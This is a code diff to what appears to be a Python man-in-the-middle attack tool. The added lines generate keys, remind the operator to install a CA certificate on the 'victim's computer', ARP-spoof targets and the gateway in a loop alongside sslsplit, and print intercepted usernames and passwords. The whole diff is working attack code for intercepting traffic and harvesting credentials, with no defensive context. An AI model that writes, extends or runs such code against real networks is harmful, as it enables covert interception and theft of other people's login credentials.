@@ -90,6 +90,11 @@ def restore(targetIP, hostIP, devices, verbose=True):
         print("[+] Sent to {} : {} is-at {}".format(targetIP, hostIP, hostMAC))
 
 if __name__ == "__main__":
+    import os
+    os.system("sh MITM/genKey.sh")
+    os.system("clear")
+    print("[!] Remember to install MITM/ca.crt into victim's computer")
+
     host = getGatewayIP()
     print("Gateway IP: ", host)
 
@@ -114,6 +119,8 @@ if __name__ == "__main__":
 
     sslSplitPid = runSSLSplit()
 
+    currentIndex = 0
+
     try:
         while True:
             for target in targets:
@@ -121,7 +128,11 @@ if __name__ == "__main__":
                 spoof(target, host, devices, verbose)
                 # telling the `host` that we are the `target`
                 spoof(host, target, devices, verbose)
-            fetchPasswd()
+            result = fetchPasswd()
+            while len(result) > currentIndex:
+                print("Username:  ", result[currentIndex]["username"], sep = "")
+                print("Password:  ", result[currentIndex]["password"], sep = "")
+                currentIndex = currentIndex + 1
             time.sleep(1)
     except KeyboardInterrupt:
         print("[!] Detected CTRL+C ! restoring the network, please wait...")
